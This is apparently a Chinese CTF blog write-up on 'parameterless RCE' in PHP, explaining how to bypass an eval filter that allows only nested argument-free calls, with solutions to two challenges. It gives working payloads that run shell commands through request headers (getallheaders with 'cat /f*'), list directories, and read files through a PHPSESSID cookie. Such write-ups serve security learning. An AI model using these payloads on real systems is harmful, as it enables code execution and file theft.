---
title: "无参数RCE"
subtitle: ""

description: ""
date: 2024-03-07T18:13:51+08:00
draft: false

tags: ["RCE"]
categories: ["Bypass"]

---

一个很有趣的RCE姿势

## 核心代码

```php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
}
```

关键点在于`('/[^\W]+((?R)?/`这个正则表达式，在该表达式下，每个函数内的参数都会被匹配

## 相关函数

### 基本操作

- `scandir()`：返回当前目录中所有的文件和目录，结果是一个数组

- `current()`与`pos()`：返回当前数组中的值（默认第一个）

- `localeconv()`：返回本地数字及货币信息的数组（该数组的第一项是`.`，可以与`scandir`配合使用）

- `getallheaders()`：获取所有请求头信息，并返回键值对

- `strrev()`：返回反转后的字符串

- `eval()`、`assert()`、`system`：命令执行

- `highlight_file()`、`show_source()`、`read_file()`、`readgzfile`：读取文件内容

- `getenv()`：获取环境变量（php7.1版本以上）

- `get_defined_vars()`：返回由已定义变量所组成的多维数组

### 数组操作

- `end()`：内部指针指向数组中最后一个元素并输出

- `next()`：指向下一个元素并输出

- `prev()`：指向上一个元素并输出

- `reset()`：指向数组中第一个元素并输出

- `each()`：返回当前元素的键名和键值，并将内部指针向前移动

- `array_rand()`：随机返回一个键名

- `array_flip()`：交换数组中的键与值，返回交换后的数组

- `array_reverse()`：以相反的顺序返回数组内容

- `array_shift()`：删除数组中的第一个元素并返回被删除的值

- `array_pop()`：删除数组中的最后一个元素并返回被删除的值

- `implode()`：用于将数组转化为字符串，让`echo`或`printf`得以输出结果

### 目录操作

- `getcwd()`：获取当前工作目录

- `chdir()`：改变当前的目录

- `dirname()`：对路径作操作，返回去掉文件名后的目录名（如`/test/index.php`返回`/test`）

举个栗子：`scandir('.')`用于返回当前目录，在无法传参数的情况下，可以用`localeconv()`构造一个`.`，再用`current()`返回`.`给`scandir()`即可

> ?payload=var_dump(scandir(current(localeconv())));

## 相关例题

### getallheaders()

- 题目来源：2023NewStarCTF-R!!C!!E!!

源码如下

```php
<?php  
highlight_file(__FILE__);  
if (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['star'])) {  
    if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])){  
        eval($_GET['star']);  
    }  
}
```

这题用到了`getallheaders()函数`，用于获取当前所有的请求头信息，但只允许在Apache环境下使用，在php7以上的版本可以用`apache_request_headers()`代替

本题思路是在请求头中添加我们要执行的系统命令，用`getallheaders()`获取所有的请求头信息，接着用`array_flip()`与`array_rand()`来调换与获取键值对，最后用`system()`来执行命令

payload

```
# parmas
?star=system(array_rand(array_flip(getallheaders())));

# headers
flag: cat /f*
```

> 由于`array_rand()`是随机获取的，因此可以删除部分请求头来提高成功率

### session_id()

- 题目来源：BUUCTF-禁止套娃

源码如下

```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```

并没有过滤`scandir()`，先看一下目录下的文件

exp

```
?exp=var_dump(scandir(current(localeconv())));
```

放包后得到结果，可以看到flag.php位于数组第四个位置

![](/img/无参数RCE/2024-03-07-18-50-31-image.png)

有三种解法，其一是利用`array_reverse()`与`next()`来对数组进行操作，再用`show_source()`之类的函数进行读取；其二是用`getallheaders()`；其三便是`session_id()`

前面也讲到，倘若中间件不是Apache，`getallheaders()`便无法使用，这里介绍下`session_id()`的使用

将恶意代码写到cookie的PHPSESSID中，再利用`session_id()`读取，之后便可以用其他函数来实现命令执行。但是`session_id()`需要开启session才能使用，因此在此之前还需要用`session_start()`来开启session服务

payload

```
# parmas
?exp=show_source(session_id(session_start()));

# headers
Cookie: PHPSESSID=flag.php
```